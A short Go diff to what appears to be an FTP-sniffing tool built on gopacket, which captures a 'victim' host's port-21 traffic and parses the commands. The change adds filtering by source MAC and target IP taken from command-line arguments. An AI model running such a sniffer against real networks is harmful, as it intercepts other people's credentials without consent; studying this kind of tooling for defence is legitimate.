@@ -9,6 +9,7 @@ import (
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
     "github.com/google/gopacket/pcap"
+	"os"
 )
 
 var (	
@@ -46,12 +47,14 @@ func parseCaughtPacket(packet gopacket.Packet) {
 		return
 	}
 	transportLayer := packet.Layer(layers.LayerTypeTCP)
-
+	
 	if transportLayer != nil {
 		tcp, _ := transportLayer.(*layers.TCP)
 		appLayer := packet.ApplicationLayer()
-		
-		if appLayer != nil && (tcp.SrcPort == 21 || tcp.DstPort == 21) {
+		linkLayer := packet.LinkLayer()
+
+		if appLayer != nil && (tcp.SrcPort == 21 || tcp.DstPort == 21) && 
+			linkLayer.LinkFlow().Src().String() == os.Args[2] {
 			payload := strings.Split(string(appLayer.Payload()), " ")
 			
 			switch payload[0] {
@@ -76,13 +79,13 @@ func parseCaughtPacket(packet gopacket.Packet) {
  */
 
 func Sniffer(victimIP string) {
-	filter := "host " + victimIP
+	filter := "host " + os.Args[3]
 	iface, err := selectInterface()
 	
 	if err != nil {
 		log.Fatal(err)
 	}
-	dev  := iface.Name
+	dev := iface.Name
 	handle, err := pcap.OpenLive(dev, snaplen, promisc, timeout)
 	
 	if err != nil {
